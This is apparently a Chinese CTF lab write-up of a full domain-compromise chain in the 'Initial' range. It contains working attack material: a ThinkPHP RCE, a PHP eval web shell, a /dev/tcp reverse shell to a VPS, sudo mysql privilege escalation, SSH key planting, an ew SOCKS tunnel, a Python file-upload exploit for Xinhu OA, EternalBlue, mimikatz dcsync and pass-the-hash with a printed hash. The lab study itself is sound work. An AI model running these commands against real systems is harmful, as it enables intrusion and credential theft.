---
layout: config.default_layout
title: 春秋云镜-Initial
date: 2025-04-04 00:44:16
updated: 2025-04-04 00:44:58
comments: true
tags: [春秋云镜,Linux靶机,Windows靶机,综合靶场]
categories: 靶机
---

# Initial

> https://yunjing.ichunqiu.com/major/detail/1077?type=1
> 

## 前期踩点

直接使用 `fscan` 扫描 （靶机IP：`39.99.128.239`）

```bash
⚡ root@kali  ~/Desktop/Tools  ./fscan -h 39.99.128.239
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-03-15 00:26:11] [INFO] 暴力破解线程数: 1
[2025-03-15 00:26:11] [INFO] 开始信息扫描
[2025-03-15 00:26:11] [INFO] 最终有效主机数量: 1
[2025-03-15 00:26:11] [INFO] 开始主机扫描
[2025-03-15 00:26:11] [INFO] 有效端口数量: 233
[2025-03-15 00:26:11] [SUCCESS] 端口开放 39.99.128.239:110
[2025-03-15 00:26:11] [SUCCESS] 端口开放 39.99.128.239:21
[2025-03-15 00:26:11] [SUCCESS] 端口开放 39.99.128.239:22
[2025-03-15 00:26:11] [SUCCESS] 端口开放 39.99.128.239:80
[2025-03-15 00:26:11] [SUCCESS] 服务识别 39.99.128.239:21 => 
[2025-03-15 00:26:11] [SUCCESS] 服务识别 39.99.128.239:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]
[2025-03-15 00:26:13] [SUCCESS] 服务识别 39.99.128.239:110 => 
[2025-03-15 00:26:17] [SUCCESS] 服务识别 39.99.128.239:80 => [http]
[2025-03-15 00:26:21] [INFO] 存活端口数量: 4
[2025-03-15 00:26:21] [INFO] 开始漏洞扫描
[2025-03-15 00:26:21] [INFO] 加载的插件: ftp, pop3, ssh, webpoc, webtitle
[2025-03-15 00:26:21] [SUCCESS] 网站标题 http://39.99.128.239      状态码:200 长度:5578   标题:Bootstrap Material Admin
[2025-03-15 00:26:28] [SUCCESS] 目标: http://39.99.128.239:80
  漏洞类型: poc-yaml-thinkphp5023-method-rce
  漏洞名称: poc1
  详细信息:
        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
```

## Thinkphp 5.0.23 RCE

直接扫出来了`Thinkphp`的`rce`漏洞，使用工具一把梭哈

![image.png](image.png)

直接`GETSHELL` ，在网站目录下生成一个一句话木马

![image.png](image1.png)

我们使用蚁剑连接

![image.png](image2.png)

虚拟终端查看权限

```bash
(www-data:/var/www/html) $ whoami
www-data
(www-data:/var/www/html) $ sudo -l
Matching Defaults entries for www-data on ubuntu-web01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User www-data may run the following commands on ubuntu-web01:
    (root) NOPASSWD: /usr/bin/mysql
(www-data:/var/www/html) $  
```

可以以`root`权限执行`mysql` ，通过`gtfobins`来寻找利用方法：https://gtfobins.github.io/gtfobins/mysql/

![image.png](image3.png)

先反弹`shell` ，将`shell` 弹到 vps 上

```bash
 bash -c 'exec bash -i &>/dev/tcp/ip/7777 <&1'
```

![image.png](image4.png)

提权，但是没有交互式`shell`

```bash
www-data@ubuntu-web01:/var/www/html$ sudo mysql -e '\! /bin/sh'
sudo mysql -e '\! /bin/sh'

id
uid=0(root) gid=0(root) groups=0(root)
```

通过`fscan`扫描我们能知道服务器开了`SSH`服务，在root下能找到`.ssh`并且存在`authorized_keys` 

我们生成新的`SSH`密钥对，并将`id_rsa.pub`覆盖`authorized_keys`

```bash
// kali
⚡ root@kali  ~  ssh-keygen -t rsa
```

```bash
// 靶机
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxXpjYGlyNDtcmbZOsYeg0b7nB7P0ltBXDjYhUBeqUxtWj7g8c3z2us9m1DZupz2u2pW4TfEFLRUC0L0+itO0eZ5stffv4DZSTElKUFToFDpFcOmvNeLhS7l2L7MM9Vzj0W57+aXumMfeNlTVqM39+yc0tbSBUUA3Kx4hdsHTdjsktWPBdUfLQyGoYGLEB3Lg3jy8WJceLuTP0Ri3Bm/Osr1o28Gd9YRF2unzV6pW8kbOpKz2BcsiknYeGvfkh+PrxmZIr8j6o4TggaVfDYX7mXA+ClA2SgtDgcLs3pwSPeZulEF2JasqkPLJ8blKQMDzwHT2ijg11XXOarTl+B/T7AjmH12kD918jZ61n1ytYvfxBwrYLTFbS9YYKwPk/sCQBEgXqkhZUrTieq0byadADS1c3WnJc20J5UbsUv+au8jnt+WW0myh63R3JH7+kUUrI6Vqlpqqd4kb/IJaroPHjh7Ihck5l7M3+Wtqwh+/2Luo63t0wQZbZH79v9uCifEU= root@kali" > authorized_keys
```

使用`SSH`连接，直接登陆成功

```bash
 ⚡ root@kali  ~  ssh root@39.99.128.239

Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-110-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Welcome to Alibaba Cloud Elastic Compute Service !

No mail.
Last login: Sat Mar 15 13:21:12 2025 from xxxxxxxx
root@ubuntu-web01:~# 
```

（PS：打到这里沙砾没了，要重新开，这里开始靶机为 `39.99.138.102`）

当前目录下能找到`flag01.txt`

```
root@ubuntu-web01:~/flag# cat flag01.txt
 ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████
░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██
 ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░
  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██
   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████
  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██
 ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████
░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░

Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.

flag01: flag{60b53231-
```

## 内网信息收集

查看网卡信息，得知内网网段是`172.22.1.0`

```bash
root@ubuntu-web01:~/flag# ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:2d:93:7a brd ff:ff:ff:ff:ff:ff
    inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0
       valid_lft 315359626sec preferred_lft 315359626sec
    inet6 fe80::216:3eff:fe2d:937a/64 scope link 
       valid_lft forever preferred_lft forever
```

上传`fscan` 进行扫描

```bash
⚡ root@kali  ~/Desktop/Tools  scp fscan root@39.99.138.102:/root
fscan                                                            100% 8384KB   2.8MB/s   00:02   
```

```bash
root@ubuntu-web01:~# ./fscan -h 172.22.1.0/24                                                                     
                                                                                                                                                                                                                                    
   ___                              _                                                                             
  / _ \     ___  ___ _ __ __ _  ___| | __                                                                         
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /                                                                         
/ /_\\_____\__ \ (__| | | (_| | (__|   <                                                                          
\____/     |___/\___|_|  \__,_|\___|_|\_\                                                                         
                     fscan version: 1.8.4                                                                         
start infoscan                                           
(icmp) Target 172.22.1.15     is alive                                                                            
(icmp) Target 172.22.1.2      is alive          
(icmp) Target 172.22.1.21     is alive                                                                            
(icmp) Target 172.22.1.18     is alive                                                                            
[*] Icmp alive hosts len is: 4                  
172.22.1.18:3306 open
172.22.1.18:445 open 
172.22.1.21:445 open
172.22.1.2:445 open
172.22.1.18:139 open
172.22.1.21:139 open                                                                                                                                                                                                                
172.22.1.2:139 open                             
172.22.1.18:135 open
172.22.1.21:135 open
172.22.1.2:135 open
172.22.1.18:80 open
172.22.1.15:80 open
172.22.1.15:22 open                                                                                               
172.22.1.2:88 open                                                                                                                                                                                                                  
[*] alive ports len is: 14                                                                                                                                                                                                          
start vulscan                                                                                                                                                                                                                       
[*] NetInfo                                                                                                       
[*]172.22.1.18                                                                                                    
   [->]XIAORANG-OA01                        
   [->]172.22.1.18
[*] NetInfo 
[*]172.22.1.21                                                                                                    
   [->]XIAORANG-WIN7                                     
   [->]172.22.1.21                                       
[*] NetInfo                                                                                                       
[*]172.22.1.2                                                                                                     
   [->]DC01                                              
   [->]172.22.1.2                                                                                                 
[*] OsInfo 172.22.1.2   (Windows Server 2016 Datacenter 14393)                                                    
[+] MS17-010 172.22.1.21        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)                           
[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1                                                                                                               
[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393             
[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600            
[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin                         
[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login         
[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统                                
[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1                                              
已完成 14/14                                             
[*] 扫描结束,耗时: 7.72653891s                                                                                    
```

我们获得了的`172.22.1.15`的`shell` ，那么`172.22.1.2` 、`172.22.1.18` 、`172.22.1.21` 是内网主机

并且内网主机`172.22.1.21` 存在永恒之蓝

## 隧道搭建

上传`ew`搭建隧道

vps：

```bash
./ew -s rcsocks -l 1080 -e 8889 &
```

靶机：

```bash
./ew -s rssocks -d 8.134.163.255 -e 8889 &
```

`kali`设置代理，修改`proxychain4` ，添加`vps`地址

```bash
 ✘ ⚡ root@kali  ~/Desktop/Tools  tail -n 10 /etc/proxychains4.conf 
#
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  8.xxx.xxx.xxx   1080
```

测试是否成功

能获取到内网地址信息，隧道搭建成功

```bash
⚡ root@kali  ~/Desktop/Tools  proxychains4 curl http://172.22.1.18\?m\=login -i                                                                                                                                                 
[proxychains] config file found: /etc/proxychains4.conf  
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                            
[proxychains] DLL init: proxychains-ng 4.17                                                                       
[proxychains] Strict chain  ...  8.xx.x.xxx:1080  ...  172.22.1.18:80  ...  OK                                                                                                                                                   
HTTP/1.1 200 OK                                                                                                                                                                                                                     
Date: Sat, 15 Mar 2025 06:03:05 GMT                      
Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9                                                      
X-Powered-By: PHP/7.1.9                                  
Expires: Thu, 19 Nov 1981 08:52:00 GMT                                                                            
Cache-Control: no-store, no-cache, must-revalidate       
Pragma: no-cache                                                                                                  
Set-Cookie: PHPSESSID=6pqaa6aera5uvkab5ip1qv2o96; path=/                                                                                                                                                                            
Transfer-Encoding: chunked    
Content-Type: text/html;charset=utf-8         
                                                                                                                  
<!DOCTYPE html>                                                                                                   
<html lang="zh-CN">                                                                                               
<head>                                                                                                                                                                                                                              
<!--<meta http-equiv="X-UA-Compatible" content="IE=edge">-->                                                      
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />                                             
<title>信呼协同办公系统</title>                                                                                   
<link rel="stylesheet" type="text/css" href="webmain/css/css.css"/>    
<div class="blank20"></div>
        <div align="center" style="height:30px;line-height:30px;color:#555555">
                Copyright &copy;2025 信呼协同办公系统v2.2.8 &nbsp; - &nbsp; 
                版权所有：<a href="http://www.rockoa.com/" style="color:#1F83C1" target="_blank">信呼开发团队</a>
        </div>
        <script type="text/javascript" src="mode/plugin/jquery-rockmodels.js"></script>                
```

`Windows`设置代理，使用`proxifier` 即可

## 信呼协同办公系统 v2.2.8

![image.png](image5.png)

弱口令尝试：`admin` `admin123` 可以进入系统…

![image.png](image6.png)

搜索引擎搜索漏洞，可以知道存在文件上传漏洞：https://www.cnblogs.com/Error1s/p/16869854.html

直接使用脚本来打

```bash
import requests

session = requests.session()
url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
# url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=<ID>'
data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}

r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})
filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
print(filepath)
id = r.json()['id']
url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir');")
print(r.text)
```

`1.php`和`exp.py`放在同一目录下

```bash
// 1.php
<?php phpinfo();eval($_POST[1]);?>
```

![image.png](image7.png)

`/upload/2025-03/15_14420947.php`

使用蚁剑连接

![image.png](image8.png)

打开虚拟终端查看权限

![image.png](image9.png)

权限是`system`那么我们能直接找`flag`

![image.png](image10.png)

```bash
flag02: 2ce3-4813-87d4-
```

提示我们要打域控制器

因为我们看到`172.22.1.21` 存在永恒之蓝，先将其拿下，因为它也是域内主机，域控应该是`172.22.1.2` 

## 永恒之蓝

通过MSF梭哈

```bash
⚡ root@kali  ~  proxychains4 msfconsole                          
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Metasploit tip: View a module's description using info, or the enhanced 
version in your browser with info -d
[proxychains] DLL init: proxychains-ng 4.17le.../
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *

       =[ metasploit v6.4.34-dev                          ]
+ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]
+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
msf6 > 
msf6 > search ms17-010
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 172.22.1.21
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp_uuid
```

梭！（成功率是真的低）

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run                                                              
[proxychains] DLL init: proxychains-ng 4.17                                                                       
[proxychains] DLL init: proxychains-ng 4.17                                                                       
                                                                                                                  
[*] 172.22.1.21:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:135  ...  OK
[+] 172.22.1.21:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 172.22.1.21:445       - Scanned 1 of 1 hosts (100% complete)
[+] 172.22.1.21:445 - The target is vulnerable.                                                                   
[*] 172.22.1.21:445 - Connecting to target for exploitation.                                          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK                    
[+] 172.22.1.21:445 - Connection established for exploitation.                                        
[+] 172.22.1.21:445 - Target OS selected valid for OS indicated by SMB reply                          
[*] 172.22.1.21:445 - CORE raw buffer dump (53 bytes)                                                             
[*] 172.22.1.21:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2   
[*] 172.22.1.21:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris   
[*] 172.22.1.21:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P   
[*] 172.22.1.21:445 - 0x00000030  61 63 6b 20 31                                   ack 1              
[+] 172.22.1.21:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 172.22.1.21:445 - Trying exploit with 12 Groom Allocations.                             
[*] 172.22.1.21:445 - Sending all but last fragment of exploit packet                       
[*] 172.22.1.21:445 - Starting non-paged pool grooming                                                            
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[+] 172.22.1.21:445 - Sending SMBv2 buffers                                                                       
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[+] 172.22.1.21:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. 
[*] 172.22.1.21:445 - Sending final SMBv2 buffers.                                                                
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK                                
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK                                
[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK                                
[*] 172.22.1.21:445 - Sending last fragment of exploit packet!                                                    
[*] 172.22.1.21:445 - Receiving response from exploit packet           
[+] 172.22.1.21:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!  
[*] 172.22.1.21:445 - Sending egg to corrupted connection.                        
[*] 172.22.1.21:445 - Triggering free of corrupted buffer.
[*] Started bind TCP handler against 172.22.1.21:4444           
。。。。
[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                
[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                
[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                            
```

成功查看用户信息

![image.png](image11.png)

加载`mimikatz` ，并`dump`所有用户密码

```bash
kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv
```

![image.png](image12.png)

可以拿到`administrator`的`hash`

```bash
10cf89a850fb1cdbe6bb432b859164c8
```

使用psexec打进去即可

```bash
⚡ root@kali  ~  proxychains4 psexec.py xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  8.134.163.255:1081  ...  172.22.1.2:445  ...  OK
[*] Requesting shares on 172.22.1.2.....
[*] Found writable share ADMIN$
[*] Uploading file EweiadZn.exe
[*] Opening SVCManager on 172.22.1.2.....
[*] Creating service VYGQ on 172.22.1.2.....
[*] Starting service VYGQ.....
[proxychains] Strict chain  ...  8.134.163.255:1081  ...  172.22.1.2:445  ...  OK
[proxychains] Strict chain  ...  8.134.163.255:1081  ...  172.22.1.2:445 [!] Press help for extra shell commands
 ...  OK
[proxychains] Strict chain  ...  8.134.163.255:1081  ...  172.22.1.2:445  ...  OK
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [�汾 10.0.14393]

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
(c) 2016 Microsoft Corporation����������Ȩ����

C:\Windows\system32> 
C:\Windows\system32> type ..\..\Users\Administrator\flag\flag03.txt
           ___   ___                                                             
 \\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) ) 
  \  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //        
  / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____   
 / /\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /   
/ /  \\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /    

flag03: e8f88d0d43d6}

Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.
```

## 总的flag

```bash
flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}
```

## 总结

靶机不算难，但是环境不稳定，永恒之蓝成功率太低了，永恒之蓝卡了得有一小时

还有就是ew搭建隧道很容易就断开了，并提示`Segmentation faul`，下次试试别的